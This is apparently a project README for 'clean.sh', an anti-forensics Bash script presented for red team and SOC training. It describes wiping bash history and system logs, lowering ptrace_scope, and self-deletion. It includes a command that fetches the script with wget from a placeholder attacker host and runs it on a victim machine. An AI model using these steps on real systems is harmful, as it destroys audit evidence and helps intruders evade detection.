# clean.sh

 Anti-Forensics Bash Script: SSH Log Wiper
This project demonstrates how attackers may clean up their traces after gaining remote access to a Linux system via SSH. It includes a Bash script that performs full cleanup of forensic artifacts, simulating realistic attacker behavior for Red Team or SOC training labs.

🎯 Features
Clears .bash_history and disables history logging

Wipes key system log files: auth.log, syslog, wtmp, btmp, etc.

Deletes temporary files from /tmp and /var/tmp

Optionally lowers ptrace_scope for stealth

Prompts user to optionally reboot the system

Self-destructs: deletes itself after execution or reboot

🧪 Lab Setup
Attacker: Kali Linux (hosts the script over HTTP)

Victim: Ubuntu server (pulls script via wget or curl and executes)

⚠️ Disclaimer
This script is for educational and red team lab use only.
Do not use on production environments or without permission.

💡 Example Use
bash
Copy
Edit
wget http://<ATTACKER_IP>:8080/clean.sh -O /tmp/clean.sh
chmod +x /tmp/clean.sh
bash /tmp/clean.sh
